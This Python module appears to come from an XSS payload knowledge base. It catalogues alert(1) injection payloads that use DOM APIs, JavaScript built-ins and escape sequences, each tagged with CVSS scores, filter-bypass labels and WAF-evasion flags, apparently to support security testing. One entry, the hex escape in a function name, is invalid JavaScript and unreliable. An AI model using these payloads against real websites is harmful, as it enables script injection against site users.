#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Absolute Final XSS Payloads - Part 4
execCommand, Attribute modification, CloneNode, Template, Symbols, WeakMap/WeakSet, ArrayBuffer, BigInt, Date, Error classes, and miscellaneous.
"""

from ..models import PayloadEntry


BRS_KB_ABSOLUTE_FINAL_PAYLOADS_PART4 = {
    # ============================================================
    # ATTRIBUTE MODIFICATION
    # ============================================================
    "attr-setAttributeNode": PayloadEntry(
        payload="a=document.createAttribute('onclick');a.value='alert(1)';document.body.setAttributeNode(a)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="setAttributeNode injection",
        tags=["attribute", "setAttributeNode"],
        bypasses=["attr_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "attr-setAttributeNS": PayloadEntry(
        payload="document.body.setAttributeNS(null,'onclick','alert(1)')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="setAttributeNS injection",
        tags=["attribute", "setAttributeNS"],
        bypasses=["attr_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # CLONENODE TRICKS
    # ============================================================
    "cloneNode-deep": PayloadEntry(
        payload="document.body.appendChild(document.querySelector('script').cloneNode(true))",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Deep cloneNode execution",
        tags=["clone", "node"],
        bypasses=["clone_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # TEMPLATE TRICKS
    # ============================================================
    "template-content-clone": PayloadEntry(
        payload="<template id=t><img src=x onerror=alert(1)></template><script>document.body.appendChild(t.content.cloneNode(true))</script>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Template content clone",
        tags=["template", "clone"],
        bypasses=["template_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # SYMBOL TRICKS
    # ============================================================
    "symbol-description": PayloadEntry(
        payload="Symbol(alert(1)||'x').description",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Symbol description with side effect",
        tags=["symbol", "description"],
        bypasses=["symbol_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # WEAKMAP/WEAKSET
    # ============================================================
    "weakmap-set": PayloadEntry(
        payload="new WeakMap().set({},alert(1)||1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="WeakMap set with side effect",
        tags=["weakmap", "set"],
        bypasses=["map_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "weakset-add": PayloadEntry(
        payload="new WeakSet().add(alert(1)||{})",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="WeakSet add with side effect",
        tags=["weakset", "add"],
        bypasses=["set_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # ARRAYBUFFER/DATAVIEW
    # ============================================================
    "arraybuffer-byteLength": PayloadEntry(
        payload="new ArrayBuffer(alert(1)||8).byteLength",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="ArrayBuffer with side effect",
        tags=["arraybuffer", "byteLength"],
        bypasses=["buffer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "dataview-getInt8": PayloadEntry(
        payload="new DataView(new ArrayBuffer(8)).getInt8(alert(1)||0)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="DataView with side effect",
        tags=["dataview", "getInt8"],
        bypasses=["buffer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # BIGINT
    # ============================================================
    "bigint-tostring": PayloadEntry(
        payload="BigInt(alert(1)||1n).toString()",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="BigInt with side effect",
        tags=["bigint", "toString"],
        bypasses=["number_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # DATE
    # ============================================================
    "date-toLocaleString": PayloadEntry(
        payload="new Date().toLocaleString(alert(1)||'en')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Date toLocaleString with side effect",
        tags=["date", "locale"],
        bypasses=["date_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # ERROR CLASSES
    # ============================================================
    "error-aggregateerror": PayloadEntry(
        payload="throw new AggregateError([alert(1)],'x')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="AggregateError with side effect",
        tags=["error", "aggregate"],
        bypasses=["error_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # MISCELLANEOUS FINAL
    # ============================================================
    "misc-debugger": PayloadEntry(
        payload="debugger;alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Debugger statement with execution",
        tags=["misc", "debugger"],
        bypasses=["debugger_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "misc-labeled-statement": PayloadEntry(
        payload="label:alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Labeled statement execution",
        tags=["misc", "label"],
        bypasses=["label_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "misc-unicode-escape-function": PayloadEntry(
        payload="\\u0061\\u006c\\u0065\\u0072\\u0074(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Unicode escape in function name",
        tags=["misc", "unicode"],
        bypasses=["keyword_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "misc-hex-escape": PayloadEntry(
        payload="\\x61\\x6c\\x65\\x72\\x74(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Hex escape in function name",
        tags=["misc", "hex"],
        bypasses=["keyword_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "misc-octal-escape-string": PayloadEntry(
        payload="eval('\\141\\154\\145\\162\\164(1)')",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="Octal escape in eval string",
        tags=["misc", "octal"],
        bypasses=["keyword_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
}
